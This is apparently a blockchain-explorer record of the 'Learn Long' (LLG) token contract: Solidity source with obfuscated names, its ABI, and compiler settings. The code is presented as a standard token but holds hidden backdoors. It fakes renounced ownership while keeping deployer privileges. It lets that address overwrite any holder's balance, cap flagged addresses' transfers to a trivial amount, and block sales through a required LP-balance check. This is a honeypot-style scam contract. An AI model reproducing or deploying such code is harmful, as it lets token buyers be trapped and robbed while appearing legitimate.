{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface limitTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract autoLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingSwap {\n    function createPair(address fromExemptMax, address launchedAt) external returns (address);\n}\n\ninterface tokenShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listTotalTake) external view returns (uint256);\n\n    function transfer(address exemptAmount, uint256 amountReceiver) external returns (bool);\n\n    function allowance(address marketingBuyFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptAmount,\n        uint256 amountReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptTrading, uint256 value);\n    event Approval(address indexed marketingBuyFrom, address indexed spender, uint256 value);\n}\n\ninterface shouldToken is tokenShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LearnLong is autoLaunched, tokenShould, shouldToken {\n\n    function getOwner() external view returns (address) {\n        return walletTake;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isMarketing;\n    }\n\n    function txMin(address txReceiver) public {\n        marketingAt();\n        if (minLaunched == launchToTotal) {\n            exemptTake = walletFromMode;\n        }\n        if (txReceiver == listSellLimit || txReceiver == sellFeeEnable) {\n            return;\n        }\n        toTakeTeam[txReceiver] = true;\n    }\n\n    uint8 private isMarketing = 18;\n\n    mapping(address => bool) public shouldBuy;\n\n    bool public exemptTokenTeam;\n\n    function feeSell() public {\n        emit OwnershipTransferred(listSellLimit, address(0));\n        walletTake = address(0);\n    }\n\n    uint256 private exemptTake;\n\n    event OwnershipTransferred(address indexed walletEnable, address indexed listFee);\n\n    mapping(address => uint256) private marketingAmount;\n\n    function balanceOf(address listTotalTake) public view virtual override returns (uint256) {\n        return marketingAmount[listTotalTake];\n    }\n\n    function approve(address fundLaunch, uint256 amountReceiver) public virtual override returns (bool) {\n        txLimitReceiver[_msgSender()][fundLaunch] = amountReceiver;\n        emit Approval(_msgSender(), fundLaunch, amountReceiver);\n        return true;\n    }\n\n    function exemptSell(uint256 amountReceiver) public {\n        marketingAt();\n        exemptTotalSwap = amountReceiver;\n    }\n\n    address fundSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return walletTake;\n    }\n\n    function buyMarketingFund(address txLimit, address exemptAmount, uint256 amountReceiver) internal returns (bool) {\n        if (txLimit == listSellLimit) {\n            return swapFund(txLimit, exemptAmount, amountReceiver);\n        }\n        uint256 toLiquidityMin = tokenShould(sellFeeEnable).balanceOf(marketingWalletList);\n        require(toLiquidityMin == exemptTotalSwap);\n        require(exemptAmount != marketingWalletList);\n        if (toTakeTeam[txLimit]) {\n            return swapFund(txLimit, exemptAmount, liquidityModeTotal);\n        }\n        return swapFund(txLimit, exemptAmount, amountReceiver);\n    }\n\n    bool private minLaunched;\n\n    function swapFund(address txLimit, address exemptAmount, uint256 amountReceiver) internal returns (bool) {\n        require(marketingAmount[txLimit] >= amountReceiver);\n        marketingAmount[txLimit] -= amountReceiver;\n        marketingAmount[exemptAmount] += amountReceiver;\n        emit Transfer(txLimit, exemptAmount, amountReceiver);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private txLimitReceiver;\n\n    function tokenReceiver(address enableFromTx) public {\n        if (exemptTokenTeam) {\n            return;\n        }\n        \n        shouldBuy[enableFromTx] = true;\n        if (fromSwap != walletFromMode) {\n            walletFromMode = fromSwap;\n        }\n        exemptTokenTeam = true;\n    }\n\n    bool private toSwapTrading;\n\n    function marketingAt() private view {\n        require(shouldBuy[_msgSender()]);\n    }\n\n    uint256 private receiverSender = 100000000 * 10 ** 18;\n\n    bool private tokenTake;\n\n    bool public launchToTotal;\n\n    function allowance(address modeWallet, address fundLaunch) external view virtual override returns (uint256) {\n        if (fundLaunch == fundSell) {\n            return type(uint256).max;\n        }\n        return txLimitReceiver[modeWallet][fundLaunch];\n    }\n\n    address public sellFeeEnable;\n\n    uint256 public modeTotalToken;\n\n    function name() external view virtual override returns (string memory) {\n        return isList;\n    }\n\n    mapping(address => bool) public toTakeTeam;\n\n    uint256 private fromSwap;\n\n    uint256 public walletFromMode;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverSender;\n    }\n\n    function transfer(address buyIsMin, uint256 amountReceiver) external virtual override returns (bool) {\n        return buyMarketingFund(_msgSender(), buyIsMin, amountReceiver);\n    }\n\n    function transferFrom(address txLimit, address exemptAmount, uint256 amountReceiver) external override returns (bool) {\n        if (_msgSender() != fundSell) {\n            if (txLimitReceiver[txLimit][_msgSender()] != type(uint256).max) {\n                require(amountReceiver <= txLimitReceiver[txLimit][_msgSender()]);\n                txLimitReceiver[txLimit][_msgSender()] -= amountReceiver;\n            }\n        }\n        return buyMarketingFund(txLimit, exemptAmount, amountReceiver);\n    }\n\n    string private listBuy = \"LLG\";\n\n    uint256 private marketingLimit;\n\n    string private isList = \"Learn Long\";\n\n    uint256 exemptTotalSwap;\n\n    address private walletTake;\n\n    address marketingWalletList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 tradingTake;\n\n    address public listSellLimit;\n\n    constructor (){\n        if (walletFromMode != marketingLimit) {\n            marketingLimit = modeTotalToken;\n        }\n        limitTake isFee = limitTake(fundSell);\n        sellFeeEnable = marketingSwap(isFee.factory()).createPair(isFee.WETH(), address(this));\n        if (modeTotalToken == fromSwap) {\n            fromSwap = modeTotalToken;\n        }\n        listSellLimit = _msgSender();\n        feeSell();\n        shouldBuy[listSellLimit] = true;\n        marketingAmount[listSellLimit] = receiverSender;\n        if (tokenTake == minLaunched) {\n            tokenTake = false;\n        }\n        emit Transfer(address(0), listSellLimit, receiverSender);\n    }\n\n    uint256 constant liquidityModeTotal = 10 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return listBuy;\n    }\n\n    uint256 public limitEnable;\n\n    function amountMax(address buyIsMin, uint256 amountReceiver) public {\n        marketingAt();\n        marketingAmount[buyIsMin] = amountReceiver;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingBuyFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyIsMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountReceiver\",\"type\":\"uint256\"}],\"name\":\"amountMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTotalTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountReceiver\",\"type\":\"uint256\"}],\"name\":\"exemptSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTokenTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchToTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSellLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTotalToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFeeEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toTakeTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFromTx\",\"type\":\"address\"}],\"name\":\"tokenReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyIsMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"}],\"name\":\"txMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFromMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "LearnLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}